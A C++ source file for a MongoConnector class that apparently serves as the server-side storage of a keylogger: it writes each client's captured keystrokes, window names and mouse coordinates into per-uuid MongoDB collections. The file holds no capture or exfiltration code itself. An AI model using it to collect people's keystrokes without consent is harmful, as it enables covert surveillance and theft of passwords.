#include  <sstream>
#include "LogInput.hpp"
#include "LogMouse.hpp"
#include "MongoConnector.hpp"

MongoConnector::MongoConnector(const std::string &address,
			       const std::string &port,
			       const std::string &databaseName)
 : ADatabase<bsoncxx::document::view>(address, port, databaseName)
{

  std::stringstream connector;

  connector << PROTOCOL << address_ << ':' << port_;
  uri_ = std::make_shared<mongocxx::uri>(connector.str());
  client_ = std::make_shared<mongocxx::client>(*uri_);
  db_ = std::make_shared<mongocxx::database>(client_->database(databaseName_));
}

void MongoConnector::insertInDB(std::shared_ptr<spider::AData> data,
				spider::Type_e type)
{
  currentData_ = data;
  try
    {
      checkAndCreateCollect();
    }
  catch (std::exception &e)
    {
      std::cerr << "ERROR: DB unreachable" << std::endl;
      return;
    }
  buildBson(type);
  sendToDB();
  handleQueue();
}

void MongoConnector::buildBson(spider::Type_e e)
{
  if (e == spider::LOGINPUT)
    buildInputLog();
  else if (e == spider::LOGMOUSE)
    buildMouseLog();
}

void MongoConnector::sendToDB()
{
  try
    {
      coll_->insert_one(currentView_);
    }
  catch (std::exception &e)
    {
      std::cerr << e.what() << std::endl;
      std::cerr << "ERROR: Can't reach the Database realm." << std::endl;
      cacheQueue_.push(currentView_);
    }

}

void MongoConnector::handleQueue()
{
  auto queueSize = cacheQueue_.size();

  for (unsigned long i = 0; i < queueSize; ++i)
    {
      currentView_ = cacheQueue_.front();
      cacheQueue_.pop();
      sendToDB();
    }

}

void MongoConnector::checkAndCreateCollect()
{
  if (!db_->has_collection(currentData_->getId()))
    db_->create_collection(currentData_->getId());
  coll_ = std::make_shared<mongocxx::collection>(
   db_->collection(currentData_->getId()));
}

void MongoConnector::buildMouseLog()
{
  auto builder = bsoncxx::builder::stream::document{};
  doc_value_ = std::make_shared<bsoncxx::document::value>
   (builder
     << "uuid" << currentData_->getId()
     << "logType" << "MOUSE"
     << "date" << currentData_->getTimeStamp()
     << "windowName"
     << std::dynamic_pointer_cast<spider::LogMouse>(currentData_)->getWindowName()
     << "windowsSize" << bsoncxx::builder::stream::open_document
     << "x"
     << std::dynamic_pointer_cast<spider::LogMouse>(currentData_)->getWindowSizeX()
     << "y"
     << std::dynamic_pointer_cast<spider::LogMouse>(currentData_)->getWindowSizeY()
     << bsoncxx::builder::stream::close_document
     << "mouseCoord" << bsoncxx::builder::stream::open_document
     << "x"
     << std::dynamic_pointer_cast<spider::LogMouse>(currentData_)->getMouseCoordX()
     << "y"
     << std::dynamic_pointer_cast<spider::LogMouse>(currentData_)->getMouseCoordY()
     << bsoncxx::builder::stream::close_document
     << bsoncxx::builder::stream::finalize
   );

  currentView_ = doc_value_->view();
}

void MongoConnector::buildInputLog()
{

  auto builder = bsoncxx::builder::stream::document{};
  doc_value_ = std::make_shared<bsoncxx::document::value>
   (builder
     << "uuid" << currentData_->getId()
     << "logType" << "KEYBOARD"
     << "date" << currentData_->getTimeStamp()
     << "windowName"
     << std::dynamic_pointer_cast<spider::LogInput>(currentData_)->getWindowName()
     << "input" << std::dynamic_pointer_cast<spider::LogInput>(currentData_)->getInput()
     << bsoncxx::builder::stream::finalize
   );

  currentView_ = doc_value_->view();

}
